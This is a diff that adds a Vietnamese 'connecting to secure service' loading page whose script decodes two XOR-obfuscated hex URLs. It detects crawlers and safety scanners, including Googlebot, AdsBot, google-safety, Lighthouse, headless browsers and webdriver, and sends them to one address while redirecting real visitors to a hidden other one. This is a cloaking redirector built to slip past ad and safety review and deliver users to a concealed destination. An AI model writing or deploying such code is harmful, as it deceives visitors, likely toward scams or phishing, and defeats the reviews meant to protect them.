@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <title>Đang Kết Nối Dịch Vụ An Toàn...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0b0f19;
+      color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .loader-card {
+      background: rgba(17, 24, 39, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 36px 28px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid rgba(229, 185, 76, 0.2);
+      border-top-color: #e5b94c;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fae498;
+      letter-spacing: 0.3px;
+    }
+    .loader-sub {
+      font-size: 12px;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-card">
+    <div class="spinner"></div>
+    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
+    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
+  </div>
+
+  <script>
+    (function() {
+      const K = "387";
+      const D = "7e7e7c0f127473f99f9bd9a6c0b082beb90d040a7b681a0e027772f18c9adee1d7d2a3b9fb0a172b233e430f356525dbc2a2f9bac3d2b5aaf30e1c2b33634b52697d2f919ca3fe8393bdb3a654494979651f52581e29dbccc2f1e19d829ef6fd005f5c725e020f2d282ada86a1d2e38889a483a7514b6d627c0109382716cbc5ffdee49383bbaa575c4e7c611914466d70cfccc2ceec958c83aca2161162393c3f0e092d39dad9f3bbb5b4";
+      const S = "7e7e7c0f127473f99f9bd9a6c0b081b4a55a124771685511007772f1d9dbf7e4878293a8ef0c62707a6016037b3a2acac9f4ffa29f86a5e5ab4a5b616d2b4d06656838c183f1ea82d385b9b256574f3d630203193563d9c2d0b0f089cb83bba65344057d64";
+
+      function dec(h) {
+        try {
+          let s = "";
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
+        try {
+          const o = new URL(rawUrl);
+          const p = new URLSearchParams(q);
+          p.forEach((v, k) => {
+            if (k !== "a") o.searchParams.set(k, v);
+          });
+          return o.toString().replace(/%7B/g, '{').replace(/%7D/g, '}');
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      function isBot() {
+        try {
+          if (navigator.webdriver) return true;
+          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+          if (!navigator.languages || navigator.languages.length === 0) return true;
+          const ua = (navigator.userAgent || '').toLowerCase();
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
+          return false;
+        } catch (err) {
+          return false;
+        }
+      }
+
+      const isB = isBot();
+      let target;
+      if (isB) {
+        target = getFinalUrl(dec(S));
+      } else {
+        target = getFinalUrl(dec(D));
+      }
+
+      function goTarget() {
+        if (target) {
+          try {
+            (window.top || window).location.replace(target);
+          } catch (e) {
+            window.location.replace(target);
+          }
+        }
+      }
+
+      if (target) {
+        if (isB) {
+          setTimeout(goTarget, 30);
+        } else {
+          let redirected = false;
+          function doRedirect() {
+            if (redirected) return;
+            redirected = true;
+            goTarget();
+          }
+
+          if (window.gtag && "") {
+            const sendTo = "".includes('/') ? "" : ("/" + "");
+            gtag('event', 'conversion', {
+              'send_to': sendTo,
+              'event_callback': function() {
+                doRedirect();
+              }
+            });
+          }
+
+          if (window.fbq && "") {
+            fbq('track', 'Lead');
+          }
+
+          setTimeout(doRedirect, 180);
+        }
+      }
+      window.addEventListener("pageshow", function(e) {
+        if (target) setTimeout(goTarget, 50);
+      });
+    })();
+  </script>
+</body>
+</html>
